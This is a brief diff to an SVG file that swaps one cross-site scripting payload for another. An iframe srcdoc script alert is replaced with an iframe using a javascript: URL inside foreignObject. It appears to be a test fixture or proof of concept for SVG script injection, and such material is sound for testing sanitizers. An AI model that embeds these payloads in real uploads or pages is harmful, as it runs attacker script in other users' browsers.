@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-    <foreignObject width="100%" height="100%">
-        <iframe srcdoc="&lt;script&gt;alert('XSS at '+location)&gt;&lt;/script&gt;"></iframe>
+    <foreignObject>
+        <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(location)"></iframe>
     </foreignObject>
 </svg>
